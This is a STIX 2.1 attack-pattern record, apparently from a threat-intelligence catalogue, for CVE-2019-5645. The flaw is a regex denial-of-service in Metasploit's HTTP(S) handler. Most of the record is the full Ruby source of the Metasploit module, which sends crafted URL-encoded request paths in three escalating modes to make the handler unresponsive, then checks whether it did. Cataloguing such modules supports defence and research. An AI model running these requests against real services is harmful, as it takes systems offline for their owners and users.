{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc217a27-5e91-4902-8017-2e724cc8daa4",
    "created": "2024-08-14T16:26:09.752251Z",
    "modified": "2024-08-14T16:26:09.752255Z",
    "name": "Metasploit HTTP(S) handler DoS",
    "description": " This module exploits the Metasploit HTTP(S) handler by sending a specially crafted HTTP request that gets added as a resource handler. Resources (which come from the external connections) are evaluated as RegEx in the handler server. Specially crafted input can trigger Gentle, Soft and Hard DoS.  Tested against Metasploit 5.0.20. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/metasploit_httphandler_dos.rb",
            "external_id": "metasploit_httphandler_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-5645"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'Metasploit HTTP(S) handler DoS',\n      'Description' => %q{\n        This module exploits the Metasploit HTTP(S) handler by sending\n        a specially crafted HTTP request that gets added as a resource handler.\n        Resources (which come from the external connections) are evaluated as RegEx\n        in the handler server. Specially crafted input can trigger Gentle, Soft and Hard DoS.\n\n        Tested against Metasploit 5.0.20.\n      },\n      'Author' => [\n        'Jose Garduno, Dreamlab Technologies AG', #Vulnerability Discovery, Metasploit module.\n        'Angelo Seiler, Dreamlab Technologies AG', #Additional research, debugging.\n      ],\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['CVE', '2019-5645']\n      ],\n      'DisclosureDate' => '2019-09-04'\n    ))\n\n    register_options(\n        [\n            OptEnum.new('DOSTYPE', [true, 'Type of DoS to trigger', 'HARD', %w[GENTLE SOFT HARD]])\n        ])\n  end\n\n  def test_service_unresponsive\n    begin\n      print_status('Testing for service unresponsiveness.')\n\n      res = send_request_cgi({\n                                 'uri' => '/' + Rex::Text.rand_text_alpha(8),\n                                 'method' => 'GET'\n                             })\n\n      if res.nil?\n        print_good('SUCCESS, Service not responding.')\n      else\n        print_error('Service responded with a valid HTTP Response; Attack failed.')\n      end\n    rescue ::Rex::ConnectionRefused\n      print_error('An unknown error occurred.')\n    rescue ::Timeout::Error\n      print_good('HTTP request timed out, most likely the ReDoS attack was successful.')\n    end\n  end\n\n\n  def dos\n    case datastore['DOSTYPE']\n    when \"HARD\"\n      resone = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(\"/%2f%26%28%21%7c%23%2b%29%2b%40%32%30\")\n      )\n      begin\n        restwo = send_request_cgi(\n            'method' => 'GET',\n            'uri' => normalize_uri(\"/%26%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%23%21\")\n        )\n      rescue ::Errno::EPIPE, ::Timeout::Error\n        # Same exceptions the HttpClient mixin catches\n      end\n      test_service_unresponsive\n\n    when \"SOFT\"\n      resone = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(\"/%5b20\")\n      )\n\n      test_service_unresponsive\n\n    when \"GENTLE\"\n      resone = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(\"/%2e%2a%7c%32%30%7c%5c\")\n      )\n\n      sleep(1)\n\n      restwo = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(\"/whatever\")\n      )\n\n      resthree = send_request_cgi(\n          'method' => 'GET',\n          'uri' => normalize_uri(\"/whatever2\")\n      )\n\n      if resthree.body.length == 0\n        print_good('SUCCESS, Service not responding.')\n      else\n        print_error('Service responded with a valid HTTP Response; Attack failed.')\n      end\n\n    else\n      fail_with Failure::BadConfig, 'Invalid DOSTYPE selected'\n    end\n\n    print_status(\"DOS request sent\")\n  end\n\n  def is_alive?\n    begin\n      connect\n    rescue Rex::ConnectionRefused\n      return false\n    ensure\n      disconnect\n    end\n    true\n  end\n\n  def run\n    print_status(\"#{rhost}:#{rport} - Sending DoS packet...\")\n    dos\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2019-09-04"
}